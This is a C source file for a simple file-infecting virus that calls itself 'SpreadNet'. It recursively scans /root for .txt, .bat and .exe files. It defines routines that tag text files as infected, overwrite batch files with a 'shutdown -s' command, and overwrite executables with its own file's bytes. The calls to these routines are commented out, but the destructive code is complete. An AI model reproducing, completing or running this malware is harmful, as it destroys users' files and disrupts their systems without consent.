#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <dirent.h>
/* limits.h defines "PATH_MAX". */
#include <limits.h>

#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"

void list(char *dir_name);
void transformTXT(char *path);
void transformEXE(char *path);
void transformBAT(char *path);

int main(){
	list("/root");
	return(0);
}

void list(char *dir_name){
	DIR *d;
	/* Open the directory specified by "dir_name". */

	d = opendir (dir_name);

	//printf("%sdir_name: %s\n", KWHT, dir_name);

	/* Check it was opened. */
	if (d){
		//printf("%sGOT TO D\n", KYEL);
		while (d) {
			//printf("%sGOT TO WHILE\n", KYEL);
			struct dirent * entry;
			const char * d_name;
			/* "Readdir" gets subsequent entries from "d". */	
			entry = readdir (d);
			//printf("%s%s\n", KBLU, entry);
			if (! entry) {
				/* There are no more entries in this directory, so break

			out of the while loop. */
				break;
			}
			d_name = entry->d_name;

			//printf("%sd_name: %s\n", KMAG, d_name);
				//if (entry->d_type & DT_DIR) {

            			/* Check that the directory is not "d" or d's parent. */

			if (strcmp (d_name, "..") != 0 && strcmp (d_name, ".") != 0) {
		       		int path_length;
		       		char path[PATH_MAX];

		       	        path_length = snprintf (path, PATH_MAX, "%s/%s", dir_name, d_name);

				/* Print the name of the file and directory. */
        		       	//printf ("%sDir: %s\n", KWHT, path);

				if (path_length >= PATH_MAX) {
       	            			fprintf (stderr, "Path length has got too long.\n");
					printf("1 \n");
                    			exit (EXIT_FAILURE);
                		}

				//Looking for  .txt
				if (strstr(d_name, ".txt") != NULL){
					printf("%sFound TXT: %s\n", KRED, path);				
					//transformTXT(path); 
				}else if (strstr(d_name, ".bat") != NULL){   //looking for .bat
					printf("%sFound BAT %s\n", KRED, path);
					//transformBAT(path);
				}else if (strstr(d_name, "spreadnet") != NULL){    //looking for myself
					printf("%sFound Myself %s\n", KBLU, path);
				}else if (strstr(d_name, ".exe") != NULL){	//looking for .exe
					printf("%sFound EXE %s\n", KRED, path);				
					//transformEXE(path);
				}

	               		/* Recursively call "list" with the new path. */
				printf("%sDIR: %s\n", KCYN, path);   
				list(path);    
           		}
		}

	}else{
		//printf("--\n");
	}
}

void transformTXT(char *path){
	FILE *infected;
	char *buffer;

	infected = fopen(path, "a+");
	if (infected){
		fprintf(infected, "\nSpreadNet Infected This File\n");
		printf("%s[+] Infected: %s\n", KGRN, path);
		fclose(infected);
	}else{
		printf("%sFile Not Opened", KWHT);
	}
}

void transformBAT(char *path){
	FILE *bat;

	bat = fopen(path, "w+");
	fprintf(bat, "@echo off\n");
	fprintf(bat, "shutdown -s\n");
	printf("%s[+] Infected: %s\n", KGRN, path);
	fclose(bat);
}

void transformEXE(char *path){
	FILE *src;
	FILE *target;

	int x;
	char buf[256];

	src = fopen(__FILE__, "rb");
	target = fopen(path, "rb+");
	x = 9940;

	while(x > 256){
		fread(buf, 256, 1, src);
		fwrite(buf, 256,1, target);
		x -= 256;
	}
	fread(buf,x,1,src);
        fwrite(buf,x,1,target);
	printf("%s[+] Infected: %s\n", KGRN, path);
	fcloseall();
}
